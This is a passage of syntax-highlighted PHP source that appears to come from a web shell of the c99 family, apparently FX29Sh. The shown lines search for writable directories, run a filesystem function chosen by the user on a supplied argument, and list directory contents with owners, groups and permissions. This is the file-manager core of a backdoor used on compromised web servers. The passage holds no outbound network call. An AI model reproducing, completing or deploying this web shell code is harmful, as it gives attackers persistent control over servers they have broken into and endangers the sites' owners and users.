<span class="lineno">1764</span> <span class="s2">        }</span>
<span class="lineno">1765</span> <span class="s2">      }</span>
<span class="lineno">1766</span> <span class="s2">      if (!</span><span class="si">$arg1</span><span class="s2">) { </span><span class="si">$arg1</span><span class="s2"> = </span><span class="si">$d</span><span class="s2">; }</span>
<span class="lineno">1767</span> <span class="s2">      if (!</span><span class="si">$arg2</span><span class="s2">) { </span><span class="si">$arg2</span><span class="s2"> = 10; }</span>
<span class="lineno">1768</span> <span class="s2">      if (is_dir(</span><span class="si">$arg1</span><span class="s2">)) {</span>
<span class="lineno">1769</span> <span class="s2">        echo &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Writable</span> <span class="nx">directories</span> <span class="p">(</span><span class="nx">Max</span><span class="o">:</span> <span class="nv">$arg2</span><span class="p">)</span> <span class="nx">in</span><span class="o">:&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="nv">$arg1</span><span class="o">&lt;</span><span class="nx">hr</span> <span class="nx">noshade</span> <span class="nx">size</span><span class="o">=</span><span class="mi">1</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1770</span> <span class="s2">        echo &quot;</span><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1771</span> <span class="s2">        recurse_dir(</span><span class="si">$arg1</span><span class="s2">,</span><span class="si">$arg2</span><span class="s2">);</span>
<span class="lineno">1772</span> <span class="s2">        echo &quot;</span><span class="o">&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1773</span> <span class="s2">        </span><span class="si">$total</span><span class="s2"> = </span><span class="si">$dir_count</span><span class="s2"> - 1;</span>
<span class="lineno">1774</span> <span class="s2">        echo &quot;</span><span class="o">&lt;</span><span class="nx">hr</span> <span class="nx">noshade</span> <span class="nx">size</span><span class="o">=</span><span class="mi">1</span><span class="o">&gt;&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Founds</span><span class="o">:&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="s2">&quot;.</span><span class="si">$total</span><span class="s2">.&quot;</span> <span class="nx">of</span> <span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Max</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span> <span class="nv">$arg2</span><span class="s2">&quot;;</span>
<span class="lineno">1775</span> <span class="s2">      }</span>
<span class="lineno">1776</span> <span class="s2">      else {</span>
<span class="lineno">1777</span> <span class="s2">        disp_error(&quot;</span><span class="nx">Directory</span> <span class="nx">is</span> <span class="k">not</span> <span class="nx">exists</span> <span class="k">or</span> <span class="nx">permission</span> <span class="nx">denied</span><span class="o">!</span><span class="s2">&quot;);</span>
<span class="lineno">1778</span> <span class="s2">      }</span>
<span class="lineno">1779</span> <span class="s2">    }</span>
<span class="lineno">1780</span> <span class="s2">    else {</span>
<span class="lineno">1781</span> <span class="s2">      if (!</span><span class="si">$arg1</span><span class="s2">) { disp_error(&quot;</span><span class="nx">No</span> <span class="nx">operation</span><span class="o">!</span> <span class="nx">Please</span> <span class="nx">fill</span> <span class="mi">1</span><span class="nx">st</span> <span class="nx">parameter</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="lineno">1782</span> <span class="s2">      else {</span>
<span class="lineno">1783</span> <span class="s2">        if (</span><span class="si">$hasil</span><span class="s2"> = </span><span class="si">$fsfunc</span><span class="s2">(</span><span class="si">$arg1</span><span class="s2">)) {</span>
<span class="lineno">1784</span> <span class="s2">          echo &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Result</span> <span class="nx">of</span> <span class="nv">$fsfunc</span> <span class="nv">$arg1</span><span class="o">:&lt;/</span><span class="nx">b</span><span class="o">&gt;&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1785</span> <span class="s2">          if (!is_array(</span><span class="si">$hasil</span><span class="s2">)) { echo &quot;</span><span class="nv">$hasil\n</span><span class="s2">&quot;; }</span>
<span class="lineno">1786</span> <span class="s2">          else {</span>
<span class="lineno">1787</span> <span class="s2">            echo &quot;</span><span class="o">&lt;</span><span class="nx">pre</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1788</span> <span class="s2">            foreach (</span><span class="si">$hasil</span><span class="s2"> as </span><span class="si">$v</span><span class="s2">) { echo </span><span class="si">$v</span><span class="s2">.&quot;</span><span class="nx">\n</span><span class="s2">&quot;; }</span>
<span class="lineno">1789</span> <span class="s2">            echo &quot;</span><span class="o">&lt;/</span><span class="nx">pre</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1790</span> <span class="s2">          }</span>
<span class="lineno">1791</span> <span class="s2">        }</span>
<span class="lineno">1792</span> <span class="s2">        else { disp_error(&quot;</span><span class="nv">$fsfunc</span> <span class="nv">$arg1</span> <span class="nx">failed</span><span class="o">!</span><span class="s2">&quot;); }</span>
<span class="lineno">1793</span> <span class="s2">      }</span>
<span class="lineno">1794</span> <span class="s2">    }</span>
<span class="lineno">1795</span> <span class="s2">    echo &quot;</span><span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span><span class="nx">\n</span><span class="s2">&quot;;</span>
<span class="lineno">1796</span> <span class="s2">  }</span>
<span class="lineno">1797</span> <span class="s2">  ###[ DIRECTORY LIST ]###</span>
<span class="lineno">1798</span> <span class="s2">  if (</span><span class="si">$act</span><span class="s2"> == &quot;</span><span class="nx">ls</span><span class="s2">&quot;) {</span>
<span class="lineno">1799</span> <span class="s2">    if (count(</span><span class="si">$ls_arr</span><span class="s2">) &gt; 0) { </span><span class="si">$list</span><span class="s2"> = </span><span class="si">$ls_arr</span><span class="s2">; }</span>
<span class="lineno">1800</span> <span class="s2">    else {</span>
<span class="lineno">1801</span> <span class="s2">      </span><span class="si">$list</span><span class="s2"> = array();</span>
<span class="lineno">1802</span> <span class="s2">      if (</span><span class="si">$h</span><span class="s2"> = @opendir(</span><span class="si">$d</span><span class="s2">)) {</span>
<span class="lineno">1803</span> <span class="s2">        while ((</span><span class="si">$o</span><span class="s2"> = readdir(</span><span class="si">$h</span><span class="s2">)) !== FALSE) { </span><span class="si">$list</span><span class="s2">[] = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">; }</span>
<span class="lineno">1804</span> <span class="s2">        closedir(</span><span class="si">$h</span><span class="s2">);</span>
<span class="lineno">1805</span> <span class="s2">      }</span>
<span class="lineno">1806</span> <span class="s2">    }</span>
<span class="lineno">1807</span> <span class="s2">    if (count(</span><span class="si">$list</span><span class="s2">) == 0) {</span>
<span class="lineno">1808</span> <span class="s2">      disp_error(&quot;</span><span class="nx">No</span> <span class="nx">such</span> <span class="nx">directory</span> <span class="k">or</span> <span class="nx">access</span> <span class="nx">denied</span><span class="o">!&lt;</span><span class="nx">br</span><span class="o">&gt;</span><span class="s2">&quot;.htmlspecialchars(</span><span class="si">$d</span><span class="s2">));</span>
<span class="lineno">1809</span> <span class="s2">    }</span>
<span class="lineno">1810</span> <span class="s2">    else {</span>
<span class="lineno">1811</span> <span class="s2">      </span><span class="si">$objects</span><span class="s2"> = array();</span>
<span class="lineno">1812</span> <span class="s2">      </span><span class="si">$vd</span><span class="s2"> = &quot;</span><span class="nx">f</span><span class="s2">&quot;; #Viewing mode</span>
<span class="lineno">1813</span> <span class="s2">      if (</span><span class="si">$vd</span><span class="s2"> == &quot;</span><span class="nx">f</span><span class="s2">&quot;) {</span>
<span class="lineno">1814</span> <span class="s2">        </span><span class="si">$objects[&quot;head&quot;]</span><span class="s2"> = array();</span>
<span class="lineno">1815</span> <span class="s2">        </span><span class="si">$objects[&quot;folders&quot;]</span><span class="s2"> = array();</span>
<span class="lineno">1816</span> <span class="s2">        </span><span class="si">$objects[&quot;links&quot;]</span><span class="s2"> = array();</span>
<span class="lineno">1817</span> <span class="s2">        </span><span class="si">$objects[&quot;files&quot;]</span><span class="s2"> = array();</span>
<span class="lineno">1818</span> <span class="s2">        foreach (</span><span class="si">$list</span><span class="s2"> as </span><span class="si">$v</span><span class="s2">) {</span>
<span class="lineno">1819</span> <span class="s2">          </span><span class="si">$o</span><span class="s2"> = basename(</span><span class="si">$v</span><span class="s2">);</span>
<span class="lineno">1820</span> <span class="s2">          </span><span class="si">$row</span><span class="s2"> = array();</span>
<span class="lineno">1821</span> <span class="s2">          if (</span><span class="si">$o</span><span class="s2"> == &quot;</span><span class="o">.</span><span class="s2">&quot;) { </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">; </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="nx">CURDIR</span><span class="s2">&quot;; }</span>
<span class="lineno">1822</span> <span class="s2">          elseif (</span><span class="si">$o</span><span class="s2"> == &quot;</span><span class="o">..</span><span class="s2">&quot;) { </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$d</span><span class="s2">.</span><span class="si">$o</span><span class="s2">; </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="nx">DIR</span><span class="s2">&quot;; }</span>
<span class="lineno">1823</span> <span class="s2">          elseif (is_dir(</span><span class="si">$v</span><span class="s2">)) {</span>
<span class="lineno">1824</span> <span class="s2">            if (is_link(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$type</span><span class="s2"> = &quot;</span><span class="nx">LINK</span><span class="s2">&quot;; }</span>
<span class="lineno">1825</span> <span class="s2">            else { </span><span class="si">$type</span><span class="s2"> = &quot;</span><span class="nx">DIR</span><span class="s2">&quot;; }</span>
<span class="lineno">1826</span> <span class="s2">            </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$v</span><span class="s2">;</span>
<span class="lineno">1827</span> <span class="s2">            </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$type</span><span class="s2">;</span>
<span class="lineno">1828</span> <span class="s2">          }</span>
<span class="lineno">1829</span> <span class="s2">          elseif(is_file(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$row</span><span class="s2">[] = </span><span class="si">$v</span><span class="s2">; </span><span class="si">$row</span><span class="s2">[] = filesize(</span><span class="si">$v</span><span class="s2">); }</span>
<span class="lineno">1830</span> <span class="s2">          </span><span class="si">$row</span><span class="s2">[] = filemtime(</span><span class="si">$v</span><span class="s2">);</span>
<span class="lineno">1831</span> <span class="s2">          if (!is_windows()) {</span>
<span class="lineno">1832</span> <span class="s2">            </span><span class="si">$ow</span><span class="s2"> = posix_getpwuid(fileowner(</span><span class="si">$v</span><span class="s2">));</span>
<span class="lineno">1833</span> <span class="s2">            </span><span class="si">$gr</span><span class="s2"> = posix_getgrgid(filegroup(</span><span class="si">$v</span><span class="s2">));</span>
<span class="lineno">1834</span> <span class="s2">            </span><span class="si">$row</span><span class="s2">[] = (</span><span class="si">$ow[&quot;name&quot;]</span><span class="s2">?</span><span class="si">$ow[&quot;name&quot;]</span><span class="s2">:fileowner(</span><span class="si">$v</span><span class="s2">)).&quot;</span><span class="o">/</span><span class="s2">&quot;.(</span><span class="si">$gr[&quot;name&quot;]</span><span class="s2">?</span><span class="si">$gr[&quot;name&quot;]</span><span class="s2">:filegroup(</span><span class="si">$v</span><span class="s2">));</span>
<span class="lineno">1835</span> <span class="s2">          }</span>
<span class="lineno">1836</span> <span class="s2">          </span><span class="si">$row</span><span class="s2">[] = fileperms(</span><span class="si">$v</span><span class="s2">);</span>
<span class="lineno">1837</span> <span class="s2">          if ((</span><span class="si">$o</span><span class="s2"> == &quot;</span><span class="o">.</span><span class="s2">&quot;) or (</span><span class="si">$o</span><span class="s2"> == &quot;</span><span class="o">..</span><span class="s2">&quot;)) </span><span class="si">{</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">][]</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno">1838</span> <span class="s2">          elseif (is_link(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$objects[&quot;links&quot;]</span><span class="s2">[] = </span><span class="si">$row</span><span class="s2">; }</span>
<span class="lineno">1839</span> <span class="s2">          elseif (is_dir(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$objects[&quot;folders&quot;]</span><span class="s2">[] = </span><span class="si">$row</span><span class="s2">; }</span>
<span class="lineno">1840</span> <span class="s2">          elseif (is_file(</span><span class="si">$v</span><span class="s2">)) { </span><span class="si">$objects[&quot;files&quot;]</span><span class="s2">[] = </span><span class="si">$row</span><span class="s2">; }</span>
<span class="lineno">1841</span> <span class="s2">          </span><span class="si">$i</span><span class="s2">++;</span>
<span class="lineno">1842</span> <span class="s2">        }</span>
<span class="lineno">1843</span> <span class="s2">        </span><span class="si">$row</span><span class="s2"> = array();</span>
<span class="lineno">1844</span> <span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Name</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1845</span> <span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Size</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1846</span> <span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Date</span> <span class="nx">Modified</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1847</span> <span class="s2">        if (!is_windows()) </span><span class="si">{</span><span class="nv">$row</span><span class="p">[]</span> <span class="o">=</span> <span class="s2">&quot;&lt;b&gt;Owner/Group&lt;/b&gt;&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno">1848</span> <span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Perms</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1849</span> <span class="s2">        </span><span class="si">$row</span><span class="s2">[] = &quot;</span><span class="o">&lt;</span><span class="nx">b</span><span class="o">&gt;</span><span class="nx">Action</span><span class="o">&lt;/</span><span class="nx">b</span><span class="o">&gt;</span><span class="s2">&quot;;</span>
<span class="lineno">1850</span> <span class="s2">        </span><span class="si">$parsesort</span><span class="s2"> = parsesort(</span><span class="si">$sort</span><span class="s2">);</span>
<span class="lineno">1851</span> <span class="s2">        </span><span class="si">$sort</span><span class="s2"> = </span><span class="si">$parsesort[0]</span><span class="s2">.</span><span class="si">$parsesort[1]</span><span class="s2">;</span>
<span class="lineno">1852</span> <span class="s2">        </span><span class="si">$k</span><span class="s2"> = </span><span class="si">$parsesort[0]</span><span class="s2">;</span>
<span class="lineno">1853</span> <span class="s2">        if (</span><span class="si">$parsesort[1]</span><span class="s2"> != &quot;</span><span class="nx">a</span><span class="s2">&quot;) </span><span class="si">{</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;d&quot;</span><span class="p">;</span><span class="si">}</span><span class="s2"></span>
<span class="lineno">1854</span> <span class="s2">        </span><span class="si">$y</span><span class="s2"> = &quot;</span> <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="nx">\</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="o">?</span><span class="s2">&quot;d&quot;</span><span class="o">:</span><span class="s2">&quot;a&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1855</span>         <span class="nv">$y</span> <span class="o">.=</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=img&amp;img=sort_&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$sort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="o">?</span><span class="s2">&quot;asc&quot;</span><span class="o">:</span><span class="s2">&quot;desc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> alt=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;a&quot;</span><span class="o">?</span><span class="s2">&quot;Asc&quot;</span><span class="o">:</span><span class="s2">&quot;Desc&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1856</span>         <span class="nv">$row</span><span class="p">[</span><span class="nv">$k</span><span class="p">]</span> <span class="o">.=</span> <span class="nv">$y</span><span class="p">;</span>
<span class="lineno">1857</span>         <span class="k">for</span><span class="p">(</span><span class="nv">$i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span><span class="nv">$i</span><span class="o">&lt;</span><span class="nb">count</span><span class="p">(</span><span class="nv">$row</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">;</span><span class="nv">$i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1858</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">!=</span> <span class="nv">$k</span><span class="p">)</span> <span class="p">{</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=&quot;</span><span class="o">.</span><span class="nv">$dspact</span><span class="o">.</span><span class="s2">&quot;&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$d</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&amp;sort=&quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="nv">$i</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1859</span>         <span class="p">}</span>
<span class="lineno">1860</span>         <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$parsesort</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1861</span>         <span class="nb">usort</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">],</span> <span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
<span class="lineno">1862</span>         <span class="nb">usort</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">],</span> <span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
<span class="lineno">1863</span>         <span class="nb">usort</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">],</span> <span class="s2">&quot;tabsort&quot;</span><span class="p">);</span>
<span class="lineno">1864</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$parsesort</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s2">&quot;d&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1865</span>           <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]);</span>
<span class="lineno">1866</span>           <span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="nb">array_reverse</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]);</span>
<span class="lineno">1867</span>         <span class="p">}</span>
<span class="lineno">1868</span>         <span class="nv">$objects</span> <span class="o">=</span> <span class="nb">array_merge</span><span class="p">(</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">],</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">],</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">],</span><span class="nv">$objects</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]);</span>
<span class="lineno">1869</span>         <span class="nv">$tab</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1870</span>         <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;cols&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="nv">$row</span><span class="p">);</span>
<span class="lineno">1871</span>         <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;head&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1872</span>         <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;folders&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1873</span>         <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;links&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1874</span>         <span class="nv">$tab</span><span class="p">[</span><span class="s2">&quot;files&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
<span class="lineno">1875</span>         <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1876</span>         <span class="k">foreach</span> <span class="p">(</span><span class="nv">$objects</span> <span class="k">as</span> <span class="nv">$a</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1877</span>           <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$a</span><span class="p">[</span><span class="mi">0</span><span class="p">];</span>
<span class="lineno">1878</span>           <span class="nv">$o</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1879</span>           <span class="nv">$dir</span> <span class="o">=</span> <span class="nb">dirname</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1880</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$disp_fullpath</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$disppath</span> <span class="o">=</span> <span class="nv">$v</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1881</span>           <span class="k">else</span> <span class="p">{</span> <span class="nv">$disppath</span> <span class="o">=</span> <span class="nv">$o</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1882</span>           <span class="nv">$disppath</span> <span class="o">=</span> <span class="nx">str2mini</span><span class="p">(</span><span class="nv">$disppath</span><span class="p">,</span><span class="mi">60</span><span class="p">);</span>
<span class="lineno">1883</span>           <span class="k">if</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;cut&quot;</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$disppath</span> <span class="o">=</span> <span class="s2">&quot;&lt;strike&gt;&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;&lt;/strike&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1884</span>           <span class="k">elseif</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$v</span><span class="p">,</span><span class="nv">$sess_data</span><span class="p">[</span><span class="s2">&quot;copy&quot;</span><span class="p">]))</span> <span class="p">{</span> <span class="nv">$disppath</span> <span class="o">=</span> <span class="s2">&quot;&lt;u&gt;&quot;</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="s2">&quot;&lt;/u&gt;&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1885</span>           <span class="k">foreach</span> <span class="p">(</span><span class="nv">$regxp_highlight</span> <span class="k">as</span> <span class="nv">$r</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1886</span>             <span class="k">if</span> <span class="p">(</span> <span class="nb">ereg</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nb">strtolower</span><span class="p">(</span><span class="nv">$o</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
<span class="lineno">1887</span>               <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]))</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="mi">3</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1888</span>                 <span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1889</span>                 <span class="o">@</span><span class="nb">ob_clean</span><span class="p">();</span>
<span class="lineno">1890</span>                 <span class="nx">disp_error</span><span class="p">(</span><span class="s2">&quot;Warning! Configuration error in </span><span class="se">\$</span><span class="s2">regxp_highlight[&quot;</span><span class="o">.</span><span class="nv">$k</span><span class="o">.</span><span class="s2">&quot;][0] - unknown command.&quot;</span><span class="p">);</span>
<span class="lineno">1891</span>                 <span class="nx">fx29shexit</span><span class="p">();</span>
<span class="lineno">1892</span>               <span class="p">}</span>
<span class="lineno">1893</span>               <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1894</span>                 <span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
<span class="lineno">1895</span>                 <span class="nv">$isdir</span> <span class="o">=</span> <span class="nb">is_dir</span><span class="p">(</span><span class="nv">$v</span><span class="p">);</span>
<span class="lineno">1896</span>                 <span class="k">if</span> <span class="p">((</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="k">or</span> <span class="p">((</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$isdir</span><span class="p">)</span> <span class="k">or</span> <span class="p">((</span><span class="nv">$r</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="k">and</span> <span class="o">!</span><span class="nv">$isdir</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1897</span>                   <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span> <span class="p">{</span><span class="nv">$r</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;b&gt;&quot;</span><span class="p">;</span> <span class="nv">$r</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;/b&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1898</span>                   <span class="nv">$disppath</span> <span class="o">=</span> <span class="nv">$r</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="o">.</span><span class="nv">$disppath</span><span class="o">.</span><span class="nv">$r</span><span class="p">[</span><span class="mi">3</span><span class="p">];</span>
<span class="lineno">1899</span>                   <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$r</span><span class="p">[</span><span class="mi">4</span><span class="p">]))</span> <span class="p">{</span> <span class="k">break</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1900</span>                 <span class="p">}</span>
<span class="lineno">1901</span>               <span class="p">}</span>
<span class="lineno">1902</span>             <span class="p">}</span>
<span class="lineno">1903</span>           <span class="p">}</span>
<span class="lineno">1904</span>           <span class="nv">$uo</span> <span class="o">=</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span>
